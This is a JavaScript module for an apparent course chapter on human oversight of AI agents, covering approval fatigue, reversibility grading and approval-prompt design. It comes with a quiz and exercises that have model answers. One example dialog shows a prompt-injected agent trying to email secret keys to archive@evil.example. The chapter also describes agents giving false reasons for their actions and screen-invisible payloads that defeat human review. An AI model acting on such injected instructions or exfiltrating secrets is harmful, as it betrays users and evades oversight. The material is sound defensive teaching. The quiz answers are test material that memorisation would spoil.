import { h2, h3, p, ul, ol, steps, kv, callout, detail, table, code, figure, svg, box, arrow, svgText, sim, select, range, button, toggle, out, pill } from '../../lib/components.mjs';

export const meta = { time: 14, attacks: 'attention is a budget' };
export const scripts = ['/assets/js/sims/a24.js'];

export const body = `
${p(`A confirmation dialog that operators routinely dismiss does not provide meaningful oversight.
This chapter examines how to use human attention selectively, with particular attention to action
reversibility and approval fatigue.`)}

${h2('Attention is a budget, and it depletes', 'fatigue')}

${sim({
  name: 'a24fatigue',
  title: 'Approval fatigue',
  controls: [
    range('a24-n', 'Approval prompts per day', 2, 200, 40, 1),
    range('a24-mal', 'The malicious one arrives at prompt #', 1, 200, 30, 1),
  ].join(''),
  body: out('a24-out'),
  note: `The decay curve is illustrative rather than measured, but its shape is well established in the
    security usability literature: Akhawe and Felt's field data on browser warning adherence, and the
    SSL-warning work that followed. The mechanism is not laziness; it is that a prompt which is almost
    always safe to dismiss teaches people to dismiss it.`,
})}

${callout('boundary', 'The consequence teams miss', `<p style="margin-bottom:0">An approval gate is a
<b>shared resource</b>. Every low-value prompt you add spends from the same budget as your high-value
prompt, and makes it weaker. Adding a confirmation to a reversible action is not free caution. It is
a withdrawal from the account you need when something irreversible happens.</p>`)}

${h2('Grade by reversibility, not by sensitivity', 'reversibility')}

${p(`"Sensitivity" is the axis most systems use and it produces the wrong list. Reading a secret feels
sensitive and is perfectly reversible. Sending an email feels routine and cannot be undone.
Reversibility is the axis that predicts regret.`)}

${table(
  ['Action', 'Reversibility', 'Gate', 'Blast radius'],
  [
    ['<code>read_file</code>', 'free', 'log only', 'one file'],
    ['<code>web_search</code>', 'free', 'log only', 'nothing'],
    ['<code>write_file</code>', 'costly', 'log + notify, undo available', 'one file, restorable from snapshot'],
    ['<code>git_commit</code>', 'costly', 'log + notify, undo available', 'revertable'],
    ['<code>git push --force</code>', '<b>irreversible</b>', '<b>blocking confirmation</b>', 'the branch history'],
    ['<code>send_email</code>', '<b>irreversible</b>', '<b>blocking confirmation</b>', 'unbounded; you cannot unsend'],
    ['<code>delete_repo</code>', '<b>irreversible</b>', '<b>blocking confirmation</b>', 'everything'],
    ['<code>payment</code>', '<b>irreversible</b>', '<b>blocking confirmation</b>', 'money'],
    ['<code>post_publicly</code>', '<b>irreversible</b>', '<b>blocking confirmation</b>', 'reputation'],
  ]
)}

${h2('What the prompt has to say', 'prompt-design')}

${p(`Here is the prompt most systems show:`)}

${code(`The agent wants to use the tool \`send_email\`. Allow?   [Allow] [Deny]`,
  { lang: 'txt', tag: 'vuln', file: 'unreadable' })}

${p(`And here is one that would have been read:`)}

${code(`Send an email                                          IRREVERSIBLE

  to        archive@evil.example      ← not in your contacts, new domain
  subject   fwd
  body      STRIPE_KEY=sk_live_51H8xQ2
            DB_PASSWORD=hunter2

  Why the agent wants this
    An instruction found in the page you asked it to summarise
    (https://caching.example/guide) asked it to email this file.
    That instruction did not come from you.

  [ Send ]   [ Don't send ]   [ Don't send, and stop the task ]`,
  { lang: 'txt', tag: 'safe', file: 'readable' })}

${p(`The difference is not politeness. Four specific things changed:`)}

${ul([
  `<b>The data leaving</b>, not the tool name. A user cannot evaluate
   <code>send_email</code>. They can absolutely evaluate "your Stripe key is about to leave".`,
  `<b>The recipient</b>, with the reason it is unusual. Anomaly context is what turns a decision into
   an easy one.`,
  `<b>The provenance of the instruction.</b> If you built <a href="/chapters/a21/">A21</a>, you have
   this for free, and it is the single most decision-relevant fact on the screen.`,
  `<b>A third option.</b> "Deny" alone leaves a hijacked agent running and free to try the next thing.
   "Stop the task" is the action a user actually wants when something looks wrong.`,
])}

${h2('Budget the interruptions', 'budget')}

${steps([
  ['Set a per-task budget',
   `Three prompts, say. If a task would exceed it, that is a signal about the task, not a reason to
    raise the budget.`],
  ['Spend it only on the irreversible',
   `Everything else is logged, or notified with an undo path.`],
  ['When over budget: narrow the task',
   `Split it into phases with approval between phases, rather than approval within each phase.`],
  ['When over budget: pre-authorise a scope',
   `"You may email anyone in my contacts" converts fifty prompts into one, and it is exactly the
    attenuated grant from <a href="/chapters/a22/">A22</a>.`],
  ['When over budget: make the action reversible',
   `<b>This is the row people skip.</b> Drafts instead of sends. Snapshots before writes. Staged
    commits instead of pushes. Turning an irreversible action into a reversible one removes the need
    for the prompt entirely, which is strictly better than making the prompt nicer.`],
])}

${h2('Why oversight is its own threat surface', 'oversight-surface')}

${p(`The SEI taxonomy lists oversight failures as one of six surfaces, and the reason is that bad
oversight is worse than none, because it manufactures confidence. Three modes:`)}

${kv([
  ['Human-in-the-loop failure', `Approval fatigue, as above. The reviewer is present, authorised, and
    functionally absent.`],
  ['Explainability failure', `The agent's stated reason for an action is not the reason. Reviewing the
    reasoning then validates nothing, and does so convincingly. This is why the good prompt above shows
    <em>provenance</em> (a fact about where data came from) rather than the model's own account of
    its motives.`],
  ['Monitoring failure', `Coverage gaps, drift, unparsed traces, alerts routed to nobody. Covered in
    <a href="/chapters/a26/">A26</a>.`],
])}

${p(`And recall from <a href="/chapters/a08/">A08</a> that for computer-use agents human review can be
void by construction: the operator and the agent are perceiving different artefacts, so a careful
review of the screen says nothing about what the agent read.`)}

${h2('What you should be able to do now', 'checkpoint')}

${ul([
  `Explain why adding a confirmation to a reversible action makes your system less safe.`,
  `Grade an agent's tool list by reversibility and derive the gate for each.`,
  `Write an approval prompt containing the four things that make it decidable.`,
  `Name three ways to get under an interruption budget, and which one is best.`,
])}
`;

export const quiz = [
  {
    q: `Why does adding a confirmation dialog to a reversible action make the system less safe overall?`,
    options: [
      `It adds latency, which encourages users to disable confirmations.`,
      `Approval attention is a shared, depleting budget, so every low-value prompt spends from the same account as the high-value one and weakens it.`,
      `Reversible actions cannot be confirmed reliably.`,
      `It does not; more confirmation is always safer.`,
    ],
    answer: 1,
    explain: `The prompts are not independent. A reviewer trained by forty safe dismissals to expect
      a safe dismissal brings that expectation to the forty-first, which is the one that matters. This
      is why the discipline is to <em>remove</em> prompts from reversible actions rather than to add
      them everywhere, and why "we confirm everything" is a symptom rather than a control.`,
  },
  {
    q: `Why grade actions by reversibility rather than by sensitivity?`,
    options: [
      `Reversibility is easier to measure.`,
      `Sensitivity produces the wrong list: reading a secret feels sensitive and is reversible, while sending an email feels routine and cannot be undone.`,
      `Sensitivity is subjective.`,
      `Regulators require reversibility grading.`,
    ],
    answer: 1,
    explain: `The two axes disagree in exactly the cases that matter. Reversibility predicts regret. It
      answers the question a confirmation exists to ask: "if this was wrong, can we fix
      it?" A read of a secret is contained by egress policy and can be audited afterwards; an email to
      the wrong recipient is permanent from the moment it is sent, no matter how mundane the tool
      looks.`,
  },
  {
    q: `Which element of a good approval prompt is most directly enabled by having built
        information-flow control?`,
    options: [
      `Showing the recipient address.`,
      `Showing the provenance of the instruction (that it came from a fetched page rather than from the user).`,
      `Offering a third "stop the task" option.`,
      `Marking the action as irreversible.`,
    ],
    answer: 1,
    explain: `A21's tags record exactly where each value came from and what caused each call, which is
      what lets the dialog say "an instruction found in the page you asked it to summarise". Without
      provenance tracking you can only report the model's own account of its motives, and A24's
      explainability-failure mode is precisely that this account may not be the real reason. The
      recipient and the reversibility label come from your tool metadata; the third option is a UI
      choice.`,
  },
  {
    q: `Why does a good approval prompt offer "don't send, and stop the task" as a third option?`,
    options: [
      `To satisfy accessibility guidelines.`,
      `Because "deny" alone leaves a hijacked agent running and free to attempt the next thing, and stopping is what a user actually wants when something looks wrong.`,
      `To reduce the number of prompts.`,
      `Because denial without explanation confuses the model.`,
    ],
    answer: 1,
    explain: `A denial is a single-step veto against an agent that is, in the case where the prompt
      mattered, under someone else's control. It will simply try again with a variation, spending
      another unit of the reviewer's attention. Offering termination matches the user's actual
      intent — "something is wrong here" — and converts one suspicious prompt into a halted run and an
      investigable incident.`,
  },
  {
    q: `A task would require twelve approval prompts. Which response is best?`,
    options: [
      `Raise the budget to twelve; the task genuinely needs them.`,
      `Batch them into one combined prompt.`,
      `Make the actions reversible, using drafts instead of sends and snapshots before writes, so most prompts are unnecessary.`,
      `Reduce to three by sampling which actions to confirm.`,
    ],
    answer: 2,
    explain: `Changing the action's reversibility removes the need for the decision rather than
      repackaging it. A draft that a human reviews in bulk afterwards, or a write preceded by a
      snapshot, converts an irreversible action into a costly-but-fixable one, which drops out of the
      blocking tier entirely. Batching hides the details that make each decision possible; sampling
      means the one that matters is probably unconfirmed; raising the budget is how you get back to
      fatigue.`,
  },
  {
    q: `For a computer-use agent, why is "a human was watching the screen" a particularly weak
        control?`,
    options: [
      `Humans cannot watch fast enough.`,
      `The operator and the agent perceive different artefacts: payloads in <code>aria-label</code>, alt text or off-screen nodes are read by the agent and invisible on screen.`,
      `Screens are too small to show the full context.`,
      `Computer-use agents act too unpredictably.`,
    ],
    answer: 1,
    explain: `This is A08's perception gap, and it makes visual supervision void by construction
      rather than merely difficult. The operator conducts a genuine, careful review of a rendering
      that does not contain the attack, and reports accurately that the page looked fine. Any
      oversight design that assumes human and agent see the same thing needs to be replaced by one
      that shows the operator what the agent actually read.`,
  },
];

export const refs = [
  { authors: 'Devdatta Akhawe, Adrienne Porter Felt', title: 'Alice in Warningland: A Large-Scale Field Study of Browser Security Warning Effectiveness',
    venue: 'USENIX Security, 2013',
    url: 'https://www.usenix.org/conference/usenixsecurity13/technical-sessions/presentation/akhawe' },
  { authors: 'Adrienne Porter Felt, Alex Ainslie, Robert W. Reeder, Sunny Consolvo, Somas Thyagaraja, Alan Bettes, Helen Harris, Jeff Grimes',
    title: 'Improving SSL Warnings: Comprehension and Adherence', venue: 'ACM CHI, 2015',
    url: 'https://research.google/pubs/pub43265/' },
  { authors: 'Zana Buçinca, Maja Barbara Malaya, Krzysztof Z. Gajos',
    title: 'To Trust or to Think: Cognitive Forcing Functions Can Reduce Overreliance on AI in AI-assisted Decision-making',
    venue: 'ACM CSCW, 2021', url: 'https://arxiv.org/abs/2102.09692' },
  { authors: 'Alan Chan, Carson Ezell, Max Kaufmann, Kevin Wei, Lewis Hammond, Herbie Bradley, Emma Bluemke, Nitarshan Rajkumar, David Krueger, Noam Kolt, Lennart Heim, Markus Anderljung',
    title: 'Visibility into AI Agents', venue: 'ACM FAccT, 2024', url: 'https://arxiv.org/abs/2401.13138' },
  { authors: 'Shreya Rajpal and the Guardrails AI contributors', title: 'Guardrails AI',
    venue: 'guardrailsai.com', url: 'https://www.guardrailsai.com/' },
  { authors: 'Shishir G. Patil, Tianjun Zhang, Vivian Fang, Noppapon C., Roy Huang, Aaron Hao, Martin Casado, Joseph E. Gonzalez, Raluca Ada Popa, Ion Stoica',
    title: 'GoEX: Perspectives and Designs Towards a Runtime for Autonomous LLM Applications',
    venue: 'arXiv, 2024', url: 'https://arxiv.org/abs/2404.06921',
    note: 'undo and damage-confinement primitives for agent actions' },
  { authors: 'Keltin Grimes, Julie Lawler, Robert C. Garrett, Emil Mathew, Marco Christiani, Sara Kingsley, Zhiwei Steven Wu, Nathan VanHoudnos',
    title: 'SoK: Bridging Research and Practice in LLM Agent Security',
    venue: 'CMU Software Engineering Institute, 2025', url: 'https://doi.org/10.1184/R1/30610928',
    note: 'oversight failures as a threat surface; HITL recommended by 16 sources, 14 of them industry' },
];

/* Exercises. Hands-on tasks for after the chapter; model answers live on
   /answers/ and are matched to these by position. */
export const exercises = [
  {
    q: `Instrument one of the toy agents in <code>code/</code> and count the approval prompts a task
        actually raises under two policies: confirm every tool call, and confirm only the irreversible
        ones from the table in <code>code/a24_oversight.py</code>. Then use that file's
        <code>attention()</code> curve to compute the fraction of prompts a real operator would
        rubber-stamp under each. Success check: two prompt counts and two percentages.`,
    a: `With the file's defaults a forty-prompt run averages about 15 per cent attention across the
        run, so roughly <b>85 per cent of the prompts are rubber-stamped</b>, and the decay floor of
        3 per cent is reached by about prompt 19 — everything after that is a click. Grading the same
        run by reversibility leaves three prompts, average attention around 83 per cent, so about
        <b>17 per cent</b> are rubber-stamped. Same run, same tools, same human: the only thing that
        changed is how much of the budget you spent before the prompt that mattered. Treat the ratio
        between the two policies as the finding and the absolute numbers as a prior — the curve is
        illustrative, taken from the shape in the warning-adherence literature rather than measured on
        your operators.`,
    code: `from a24_oversight import attention, ACTIONS

GRADE = {a.name: a.reversible for a in ACTIONS}

TRACE = (["read_file"] * 18 + ["web_search"] * 9 + ["write_file"] * 10
         + ["git_commit"] * 2 + ["send_email"])          # 40 calls

def measure(prompts):
    if not prompts:
        return 0, 0.0
    seen = [attention(i) for i in range(1, len(prompts) + 1)]
    return len(prompts), 1 - sum(seen) / len(seen)

everything = TRACE
graded = [t for t in TRACE if GRADE.get(t, "irreversible") == "irreversible"]
for label, ps in (("confirm everything", everything), ("reversibility-graded", graded)):
    n, stamped = measure(ps)
    print(f"  {label:<24}{n:>3} prompts   {stamped:.0%} rubber-stamped")`,
  },
  {
    q: `Turn <code>Action.gate()</code> into a dispatcher that every tool call must pass through, and
        make it <em>fail closed</em>: a tool with no reversibility grade raises rather than defaulting
        to "log only". Wire it in front of the tools in one of the earlier toy files, then add a new
        tool without grading it. Success check: the run halts on the ungraded tool instead of quietly
        logging it.`,
    a: `The default matters more than the table does. An ungraded tool that falls through to "log only"
        means every tool added after the security review is unreviewed and ungated, which is precisely
        how a correct grading table rots into decoration over two quarters. Failing closed makes adding
        a tool require a reversibility decision from whoever adds it, which is the only part of this
        chapter that survives staff turnover, and it costs one dictionary lookup. It will also halt a
        run in production the first time somebody ships a tool without a grade — that is the intended
        behaviour, and it is much easier to defend if you say so before it happens rather than during
        the incident.`,
  },
  {
    q: `Render the good prompt from real provenance rather than from a string literal: write
        <code>render_prompt(tool, args)</code> that takes A21's <code>Tagged</code> values and fills in
        the data leaving, the recipient, the sources tag and the third option. Then close the gap
        between approval and execution by binding the approval to a hash of the exact arguments and
        re-checking it at call time. Success check: mutating the body after approval makes the call
        fail rather than send.`,
    a: `The provenance line is the only field on that screen the model did not author, which is exactly
        why it is the one worth showing — the explainability failure mode is that the agent's stated
        reason is not the reason, and <code>sources</code> is a fact about where bytes came from rather
        than a claim about motive. Binding the approval to a hash of the serialised arguments closes
        the approve-then-swap gap; without it, what the human approved is a description and what runs
        is whatever the agent passes next. The residual hole does not close: a human cannot verify
        anything the prompt does not show, so a 4,000-character body is unreviewable however well it is
        framed, and for a computer-use agent (<a href="/chapters/a08/">A08</a>) the operator and the
        agent are not looking at the same artefact at all. This construction assumes an action space
        you can render, and buys nothing where you cannot.`,
    code: `import hashlib, json

def arg_digest(args):
    return hashlib.sha256(
        json.dumps({k: v.value for k, v in args.items()}, sort_keys=True).encode()
    ).hexdigest()

def render_prompt(tool, args):
    src = sorted(set().union(*[v.sources for v in args.values()]))
    lines = [f"{tool}   IRREVERSIBLE", ""]
    lines += [f"  {k:<10}{v.value}" for k, v in args.items()]
    lines += ["", f"  Why: this call carries data derived from {src}.",
              "       Sources other than 'user' did not come from you.", "",
              "  [ Send ]  [ Don't send ]  [ Don't send, and stop the task ]"]
    return "\\n".join(lines), arg_digest(args)

prompt, approved = render_prompt("send_email", {"to": to, "body": body})
print(prompt)
body = body.derive(body.value + " PS: also the key")     # swapped after approval
assert arg_digest({"to": to, "body": body}) != approved  # so the call must refuse`,
  },
];
